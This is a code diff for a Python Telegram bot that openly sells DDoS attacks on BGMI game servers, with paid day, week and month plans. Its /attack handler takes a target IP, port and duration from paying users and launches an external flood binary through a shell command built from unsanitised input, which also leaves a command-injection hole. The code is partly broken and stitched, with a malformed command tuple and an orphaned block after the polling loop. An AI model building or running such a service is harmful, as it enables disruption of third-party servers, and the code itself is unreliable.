@@ -285,6 +285,253 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
+@bot.message_handler(commands=['attack'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+                response = "🛑ƈօօʟɖօառ ɮʀօ🛑"
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert port to integer
+            time = int(command[3])  # Convert time to integer
+            if time > 1000:
+                response = "⚠️ 𝐢𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭 ⚠️𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 1000."
+            else:
+                record_command_logs(user_id, '/bgmi1', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./adarsh {target} {port} {time} 50", "./adarsh1 {target} {port} {time} 10"
+                process = subprocess.run(full_command, shell=True)
+                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 ♦️ 1♦️𝙀𝙉𝘿\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹@JODSMOKER1 & @jodsmoker🌹"
+                bot.reply_to(message, response)  # Notify the user that the attack is finished
+        else:
+            response = "⚠️1 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀⚠️\n\n/ʙɢᴍɪ1 <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙀𝙉𝘼 👍\n\n★[GOP GOP GOP ]★"  # Updated command syntax
+    else:
+        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @JODSMOKER1")
+
+    bot.reply_to(message, response)
+
+
+# Add /mylogs command to display logs recorded for bgmi and website commands
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        try:
+            with open(LOG_FILE, "r") as file:
+                command_logs = file.readlines()
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                if user_logs:
+                    response = "Your Command Logs:\n" + "".join(user_logs)
+                else:
+                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿."
+        except FileNotFoundError:
+            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+    else:
+        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @jodsmoker"
+
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['help'])
+def show_help(message):
+    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
+💥 /attack
+💥 /rules
+💥 /mylogs
+💥 /plan 
+💥 /myinfo
+
+𝘽𝙪𝙮 :- @JODSMOKER1
+𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- @JODSMOKER1 and that's brother @jodsmoker 
+'''
+    for handler in bot.message_handlers:
+        if hasattr(handler, 'commands'):
+            if message.text.startswith('/help'):
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+            elif handler.doc and 'admin' in handler.doc.lower():
+                continue
+            else:
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+    bot.reply_to(message, help_text)
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏ𝙨 ʙᴏᴛ, {user_name}! ᴛʜɪ𝙨 ɪ𝙨 ʜɪɢʜ ǫᴜᴀʟɪᴛʏ 𝙨ᴇʀᴠᴇʀ ʙᴀ𝙨ᴇᴅ ᴅᴅᴏ𝙨. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇ𝙨𝙨.
+🤖Try To Run This Command : /help 
+✅BUY :- @JODSMOKER1'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['rules'])
+def welcome_rules(message):
+    user_name = message.from_user.first_name
+    response = f'''𝙉𝙊 𝙍𝙐𝙇𝙀𝙎 🤗🤗'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['plan'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''𝙃𝙚𝙮 - {user_name}
+
+𝙑𝙞𝙥 🌟 :
+-> 𝘼𝙩𝙩𝙖𝙘𝙠 𝙏𝙞𝙢𝙚 : 1000 (𝙎)
+> 𝘼𝙛𝙩𝙚𝙧 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙞𝙢𝙞𝙩 : 10 𝙨𝙚𝙘
+-> 𝘾𝙤𝙣𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 : 9
+
+𝙋𝙧-𝙞𝙘𝙚 𝙇𝙞𝙨𝙩💸 :
+𝘿𝙖𝙮-->90 𝙍𝙨
+𝙒𝙚𝙚𝙠-->400 𝙍𝙨
+𝙈𝙤𝙣𝙩𝙝-->1000 𝙍𝙨
+'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['admincmd'])
+def welcome_plan(message):
+    user_name = message.from_user.first_name
+    response = f'''{user_name}, Admin Commands Are Here!!:
+
+💥 /approval <userId> : Add a User.
+💥 /remove <userid> Remove a User.
+💥 /allusers : Authorised Users Lists.
+💥 /logs : All Users Logs.
+💥 /broadcast : Broadcast a Message.
+💥 /clearlogs : Clear The Logs File.
+💥 /clearusers : Clear The USERS File.
+'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split(maxsplit=1)
+        if len(command) > 1:
+            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                for user_id in user_ids:
+                    try:
+                        bot.send_message(user_id, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            response = "Broadcast Message Sent Successfully To All Users 👍."
+        else:
+            response = "🤖 Please Provide A Message To Broadcast."
+    else:
+        response = "Only Admin Can Run This Command 😡."
+
+    bot.reply_to(message, response)
+
+
+
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+
+
+with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
+                else:
+                    file.truncate(0)
+                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
+        except FileNotFoundError:
+            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+    else:
+        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐"
+    bot.reply_to(message, response)
+
+
+@bot.message_handler(commands=['clearusers'])
+def clear_users_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+                else:
+                    file.truncate(0)
+                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
+        except FileNotFoundError:
+            response = "𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
+    else:
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @JODSMOKER1 & that's brother @jodsmoker"
+    bot.reply_to(message, response)
+ 
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+        except FileNotFoundError:
+            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+    else:
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @JODSMOKER1 & @jodsmoker"
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['logs'])
+def show_recent_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
+            try:
+                with open(LOG_FILE, "rb") as file:
+                    bot.send_document(message.chat.id, file)
+            except FileNotFoundError:
+                response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+                bot.reply_to(message, response)
+        else:
+            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
+            bot.reply_to(message, response)
+    else:
+        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @JODSMOKER1 & @jodsmoker"
+        bot.reply_to(message, response)
+
+
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"🥰𝐇𝐄𝐘 -> {username} \n 𝘼𝙏𝙏𝘼𝘾𝙆 1--> [𝐒𝐓𝐀𝐑𝐓𝐄𝐃]\n\n†αrgε† -> {target}\np⊕r† -> {port}\n†ïmε -> {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\ngαmε --> 🇮🇳🅑🅖🅜🅘🇮🇳\n\n彡[GOP GOP GOP 🥰 @JODSMOKER1 & that's brother @jodsmoker]彡"
+    bot.reply_to(message, response)
+
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+# Handler for /bgmi command
 @bot.message_handler(commands=['bgmi1'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
@@ -440,5 +687,6 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
+
 
 
